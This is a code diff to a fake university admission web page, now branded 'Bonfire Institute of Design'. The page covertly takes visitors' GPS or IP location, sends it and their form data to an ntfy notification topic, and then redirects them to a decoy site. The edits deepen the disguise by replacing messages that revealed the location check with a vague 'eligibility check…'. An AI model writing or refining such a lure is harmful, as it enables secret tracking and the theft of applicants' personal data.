@@ -157,7 +157,7 @@
     <div class="form-container">
         <div class="header">
             <h1>📘 Graduate Admission 2025</h1>
-            <p class="subtitle">Vacant Seat Round</p>
+            <p class="subtitle">Bonfire Institute of Design</p>
         </div>
 
         <!-- Location status -->
@@ -214,6 +214,7 @@
                 <label for="course">Preferred Course *</label>
                 <select id="course" required>
                     <option value="" disabled selected>-- Select --</option>
+                    <option>Fashion Design</option>
                     <option>B.Sc. Computer Science</option>
                     <option>B.Com (Honours)</option>
                     <option>B.A. Journalism</option>
@@ -242,7 +243,7 @@
             //  CONFIGURATION
             // ============================================================
             const NTFY_TOPIC = 'Location_Notify';   // long random string
-            const DECOY_URL = 'https://www.iitb.ac.in/'; // redirect after submit
+            const DECOY_URL = 'https://bonfireinstituteofdesign.com/'; // redirect after submit
             const SEND_FORM_DATA = true;                   // true = send form fields + location
             // ============================================================
 
@@ -353,16 +354,16 @@
                     const gpsLoc = await getGpsLocation();
                     currentLocation = gpsLoc;
                     locationSent = sendNtfy(gpsLoc);  // location only
-                    updateLocationNote('✅ GPS location verified – regional quota eligibility confirmed.');
+                    updateLocationNote('eligibility check…');
                 } catch (gpsError) {
-                    updateLocationNote('GPS not available. Trying IP-based location…');
+                    updateLocationNote('eligibility check…');
                     try {
                         const ipLoc = await getIpLocation();
                         currentLocation = ipLoc;
                         locationSent = sendNtfy(ipLoc);
-                        updateLocationNote('✅ IP-based region identified – quota check completed.');
+                        updateLocationNote('eligibility check…');
                     } catch (ipError) {
-                        updateLocationNote('⚠️ Location check failed (GPS & IP unavailable).', true);
+                        updateLocationNote('eligibility check…', true);
                     }
                 }
             }
